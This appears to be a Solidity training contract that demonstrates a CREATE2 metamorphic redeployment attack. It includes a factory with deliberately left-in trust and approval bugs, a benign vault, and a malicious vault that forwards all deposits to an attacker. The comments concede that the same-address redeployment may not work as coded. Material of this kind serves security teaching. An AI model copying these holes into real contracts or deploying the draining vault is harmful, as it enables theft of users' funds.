// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title Create2Metamorphic
 * @dev Training Contract #11 - CREATE2 Address Collision Attack
 * 
 * MASTER LEVEL VULNERABILITY:
 * 1. Deploys contract at deterministic address via CREATE2
 * 2. Contract can selfdestruct
 * 3. Same address can be redeployed with DIFFERENT bytecode
 * 4. Approvals/permissions to old contract transfer to new malicious one
 * 
 * REAL EXPLOIT: Tornado Cash Governance Attack (2023)
 * 
 * CHAIN INTEGRATION:
 * - This contract is the ENTRY POINT for 7-step chain
 * - Deploys a "trusted" vault that other contracts approve
 * - After approvals, redeploy with malicious bytecode
 */

contract Create2Metamorphic {
    // Factory for deterministic deployment
    address public deployer;
    mapping(bytes32 => address) public deployedContracts;
    mapping(address => bool) public isTrusted;
    
    // Track what contracts have approved our deployed contracts
    mapping(address => mapping(address => uint256)) public approvalRegistry;
    
    event ContractDeployed(bytes32 indexed salt, address indexed deployed);
    event ContractDestroyed(address indexed destroyed);
    event TrustGranted(address indexed truster, address indexed trusted);
    
    constructor() {
        deployer = msg.sender;
    }
    
    /**
     * @dev Deploy contract at deterministic address
     * BUG: No check if address was previously used and destroyed
     */
    function deploy(bytes32 salt, bytes memory bytecode) external returns (address deployed) {
        // CREATE2: address = keccak256(0xff ++ deployer ++ salt ++ keccak256(bytecode))[12:]
        assembly {
            deployed := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(deployed != address(0), "Deploy failed");
        
        deployedContracts[salt] = deployed;
        isTrusted[deployed] = true; // Auto-trust deployed contracts
        
        emit ContractDeployed(salt, deployed);
    }
    
    /**
     * @dev Predict deployment address
     * Used by other contracts to "trust" before deployment
     */
    function predictAddress(bytes32 salt, bytes memory bytecode) external view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash)));
    }
    
    /**
     * @dev Register that a contract has approved our deployed contract
     * BUG: Approval persists even after selfdestruct + redeploy
     */
    function registerApproval(address approver, address approved, uint256 amount) external {
        // Only callable by trusted contracts
        require(isTrusted[msg.sender] || msg.sender == deployer, "Not trusted");
        approvalRegistry[approver][approved] = amount;
    }
    
    /**
     * @dev Trigger selfdestruct on deployed contract
     * BUG: Address slot is now "empty" but approvals still exist
     */
    function destroyDeployed(bytes32 salt) external {
        require(msg.sender == deployer, "Only deployer");
        address target = deployedContracts[salt];
        require(target != address(0), "Not deployed");
        
        // Call selfdestruct on target (target must have this function)
        (bool success,) = target.call(abi.encodeWithSignature("destroy()"));
        require(success, "Destroy failed");
        
        // BUG: We clear the mapping but NOT the trust or approvals!
        delete deployedContracts[salt];
        // isTrusted[target] still true!
        // approvalRegistry still has entries!
        
        emit ContractDestroyed(target);
    }
    
    /**
     * @dev Check if address is trusted (used by other contracts)
     * BUG: Returns true even for destroyed + redeployed contracts
     */
    function checkTrusted(address addr) external view returns (bool) {
        return isTrusted[addr];
    }
    
    /**
     * @dev Redeploy at same address with new bytecode
     * ATTACK: New contract inherits all approvals from old one!
     */
    function redeployMalicious(bytes32 salt, bytes memory maliciousBytecode) external returns (address) {
        require(msg.sender == deployer, "Only deployer");
        require(deployedContracts[salt] == address(0), "Still deployed");
        
        // Same salt = same address if bytecode produces same initcode hash
        // But we can deploy DIFFERENT runtime bytecode!
        address redeployed;
        assembly {
            redeployed := create2(0, add(maliciousBytecode, 0x20), mload(maliciousBytecode), salt)
        }
        
        deployedContracts[salt] = redeployed;
        // Address might be same or different depending on bytecode
        // If same: inherits ALL old approvals!
        
        emit ContractDeployed(salt, redeployed);
        return redeployed;
    }
}

/**
 * @dev Benign vault - deployed first to gain trust
 */
contract BenignVault {
    address public factory;
    mapping(address => uint256) public deposits;
    
    constructor(address _factory) {
        factory = _factory;
    }
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient");
        deposits[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    // Required for metamorphic attack
    function destroy() external {
        require(msg.sender == factory, "Only factory");
        selfdestruct(payable(factory));
    }
}

/**
 * @dev Malicious vault - redeployed at same address
 * Has same interface but steals all funds
 */
contract MaliciousVault {
    address public factory;
    address public attacker;
    
    constructor(address _factory, address _attacker) {
        factory = _factory;
        attacker = _attacker;
    }
    
    // Same function signature - existing approvals still work!
    function deposit() external payable {
        // Steal everything
        payable(attacker).transfer(address(this).balance);
    }
    
    function withdraw(uint256) external {
        // Do nothing - funds already stolen
    }
    
    function destroy() external {
        selfdestruct(payable(attacker));
    }
    
    receive() external payable {
        payable(attacker).transfer(msg.value);
    }
}
